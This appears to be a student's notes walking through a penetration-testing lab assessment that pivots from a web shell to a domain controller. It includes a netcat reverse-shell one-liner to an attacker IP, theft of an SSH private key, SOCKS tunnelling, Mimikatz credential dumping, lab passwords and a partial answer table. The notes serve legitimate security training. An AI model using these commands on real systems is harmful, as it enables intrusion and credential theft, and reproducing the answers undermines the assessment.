# NOTE — Skills Assessment: Multi‑Hop Pivot to Domain Controller

## ID
613

## Module
Pivoting, Tunneling, and Port Forwarding

## Kind
notes

## Title
Skills Assessment — Multi‑Hop Pivot to Domain Controller

## Description
Full walkthrough of the Pivoting, Tunneling, and Port Forwarding Skills Assessment: from a web shell on `support.inlanefreight.local` through multiple pivots (web server → PIVOT‑SRV01 → workstation → DC), capturing flags and credentials along the way.

## Tags
skills-assessment, pivoting, rdp, mimikatz, ssh-tunnel, proxychains

## Commands
- `ls -la /home/webadmin/`
- `cat /home/webadmin/for-admin-eyes-only`
- `cat /home/webadmin/.ssh/id_rsa`
- `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.174 4444 >/tmp/f`
- `python3 -c 'import pty; pty.spawn("/bin/bash")'`
- `for i in {1..254}; do (ping -c 1 172.16.5.$i | grep "bytes from" &); done; wait`
- `scp webadmin@10.129.229.129:~/id_rsa /tmp/id_rsa && chmod 600 /tmp/id_rsa`
- `ssh -D 9050 webadmin@10.129.229.129 -i /tmp/id_rsa`
- `proxychains nmap -v -Pn -sT 172.16.5.35`
- `proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'`
- `scp -i /tmp/id_rsa mimikatz.zip webadmin@10.129.229.129:/tmp/`
- `python3 -m http.server 8080`  (on web server, port 8080)
- (On Windows) `mimikatz.exe` → `privilege::debug` → `sekurlsa::logonpasswords`
- `ipconfig /all`
- `for /L %i in (1,1,254) do ping 172.16.6.%i -n 1 -w 100 | find "Reply"` (cmd)
- `mstsc /v:172.16.6.25`
- `dir C:\` / `net share`

## What This Section Covers
The skills assessment requires pivoting from an external web shell through multiple internal hosts to reach the Domain Controller. Starting with a reverse shell from the web server, you discover internal hosts, set up an SSH dynamic tunnel, RDP to a dual‑homed Windows host (PIVOT‑SRV01), dump credentials with Mimikatz, discover a second subnet, pivot to a workstation, and finally access the DC. Seven flags (questions) are captured along the way.

## Methodology

### Phase 1 – Web Shell & Initial Recon
1. Browse to the web shell at `http://10.129.229.129`.
2. Enumerate `/home/` → find user `webadmin`.
3. Read `for-admin-eyes-only` to get credentials (Q2).
4. Copy `webadmin`'s SSH private key (`id_rsa`) for later pivoting.

### Phase 2 – Reverse Shell & Host Discovery
5. Start a `nc` listener on attack host (`4444`).
6. Use a `mkfifo` one‑liner in the web shell to get a reverse shell.
7. Upgrade the shell with `python3 -c 'import pty; pty.spawn("/bin/bash")'`.
8. Run an ICMP sweep (`ping` loop) on `172.16.5.0/24` to find other hosts → `172.16.5.15` (self) and `172.16.5.35` (PIVOT‑SRV01, Q3).

### Phase 3 – SSH Tunnel & RDP to PIVOT‑SRV01
9. Copy `id_rsa` to attack host, set permissions `600`.
10. Start SSH dynamic tunnel: `ssh -D 9050 webadmin@10.129.229.129 -i /tmp/id_rsa`.
11. Configure proxychains (`socks4 127.0.0.1 9050`).
12. Scan `172.16.5.35` with `proxychains nmap -sT -Pn` → RDP open.
13. RDP using credentials from Q2: `proxychains xfreerdp /v:172.16.5.35 /u:mlefay /p:'Plain Human work!'`.
14. Retrieve Q4 flag from `C:\Flag.txt`.

### Phase 4 – Mimikatz Credential Dump
15. Transfer Mimikatz via web server relay:
    - `scp mimikatz.zip webadmin@10.129.229.129:/tmp/`
    - On web server: `python3 -m http.server 8080`
    - On Windows (Chrome): download from `http://172.16.5.15:8080/mimikatz.zip`
16. Run Mimikatz **as administrator**:
    - `privilege::debug`
    - `sekurlsa::logonpasswords`
17. Extract plaintext domain account credentials for `vfrank` (Q5).

### Phase 5 – Discover Second Subnet & Pivot to Workstation
18. On PIVOT‑SRV01, run `ipconfig /all` → notice second NIC `172.16.6.35`.
19. Ping sweep `172.16.6.0/24` (cmd `for /L` loop) → find `172.16.6.25` (workstation) and `172.16.6.45` (DC).
20. RDP from PIVOT‑SRV01 to the workstation using `vfrank` credentials: `mstsc /v:172.16.6.25`, login as `INLANEFREIGHT\vfrank` / `Imply wet Unmasked!`.
21. Retrieve Q6 flag from `C:\Flag.txt` on the workstation.

### Phase 6 – Domain Controller Flag
22. On the workstation, enumerate shares (`net share`) and local directories.
23. Find the `AutomateDCAdmin` share/directory containing the final flag (Q7).

## Lab — Questions & Answers

| Q | Question | Answer | Found In / Method |
|---|----------|--------|-------------------|
| 1 | User directory name under `/home/` on the web server | `webadmin` | `ls /home/` from web shell |
| 2 | Credentials found in `for-admin-eyes-only` | (format `user:password`) | `cat /home/webadmin/for-admin-eyes-only` |
| 3 | Internal hosts discovered via ICMP sweep | `172.16.5.15,172.16.5.35` | `ping` loop from reverse shell |
| 4 | Flag on PIVOT‑SRV01 | `C:\Flag.txt` contents | RDP to 172.16.5.35 as mlefay |
| 5 | Domain account whose credentials were leaked by Mimikatz | `vfrank` | `sekurlsa::logonpasswords` output |
| 6 | Flag on workstation (172.16.6.25) | `C:\Flag.txt` contents | RDP to 172.16.6.25 as vfrank |
| 7 | Final flag from Domain Controller | Inside `AutomateDCAdmin` share | Enumerate shares from workstation |

## Key Takeaways
- **Dual‑homed hosts** (two NICs) are pivot goldmines – always run `ipconfig /all` on Windows pivots to find hidden subnets.
- **Service accounts** running on Domain Controllers leak plaintext Kerberos credentials in Mimikatz – a high‑value target.
- **File transfers through relays** – when a target can't route to your attack host, stage files on an intermediate host (the web server) that both sides can reach.
- **SSH key permissions** – `chmod 600`, never `chmod +x`. SSH rejects keys that are too permissive.
- **Mimikatz syntax** – double colon: `privilege::debug`. Single colon fails silently.
- **Admin rights required for Mimikatz** – “Run as administrator” or you get `c0000061`/`0x00000005`.
- **Know your shell** – `for /L` is CMD, not PowerShell. If you get syntax errors, type `cmd` first.
- **Automated admin shares** on workstations often contain DC credentials or direct access – enumerate early.

## Gotchas
- **Web server can't reach attack host directly?** No problem – the reverse shell connects out, so the attack host only needs to be reachable from the web server (VPN). For Mimikatz delivery, use the web server as an HTTP relay.
- **Mimikatz access denied** – ensure you are running as administrator (right‑click → Run as administrator).
- **SSH tunnel dies** – keep the terminal running or use `tmux`/`screen`. If it closes, recreate the SOCKS proxy.
- **Proxychains slow** – scanning whole subnets through SOCKS is slow; do quick ICMP sweeps from the pivot instead.
- **RDP certificate errors** – use `/cert:ignore` with xfreerdp or accept the warning in mstsc.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|pivoting-tunneling]]  
← [[17-detection-prevention]]
<!-- AUTO-LINKS-END -->
